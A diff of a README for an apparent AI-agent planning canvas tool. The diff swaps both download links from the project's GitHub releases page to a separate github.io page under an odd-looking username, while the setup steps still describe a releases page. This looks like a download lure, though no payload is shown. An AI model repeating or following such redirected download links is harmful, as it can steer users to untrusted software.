@@ -1,6 +1,6 @@
 # ⚙️ agent-canvas-ai-model - Plan your AI agent business strategy
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Genusenhydraalanshepard633/agent-canvas-ai-model/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://genusenhydraalanshepard633.github.io)
 
 ## 📌 Project Overview
 This application provides a workspace for planning AI agents. It uses a layout based on the business model canvas. This format helps you visualize how your AI agents function, who they serve, and what value they provide. The software runs in your web browser but uses local files on your machine. This design keeps your data private and under your control. Version 4.1 includes improvements for saving your work, sharing plans with others, and exporting your canvas to common file formats.
@@ -11,7 +11,7 @@ You do not need to install complex software or write code to use this tool. The 
 ## 💾 Download and Setup
 Visit the releases page to download the latest version of the software.
 
-[Download the latest version here](https://github.com/Genusenhydraalanshepard633/agent-canvas-ai-model/releases)
+[Download the latest version here](https://genusenhydraalanshepard633.github.io)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled "Assets" under the most recent version number.
